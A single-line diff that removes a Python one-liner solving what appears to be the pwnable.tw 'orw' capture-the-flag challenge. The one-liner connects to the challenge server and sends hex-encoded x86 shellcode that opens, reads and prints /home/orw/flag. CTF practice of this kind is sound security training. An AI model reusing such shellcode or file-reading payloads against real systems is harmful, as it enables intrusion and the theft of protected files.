@@ -1,1 +1,0 @@
-python -c 'import socket; from struct import *; s=socket.create_connection(("chall.pwnable.tw", 10001)); print(s.recv(100)); payload = "31c0b00531c931d25168666c6167686f72772f686f6d652f682f2f2f6889e3cd8089c389e131d2b230b003cd80bb01000000b004cd80".decode("hex"); s.send(payload + "\n" + "cat /home/orw/flag"); print(s.recv(1000));'
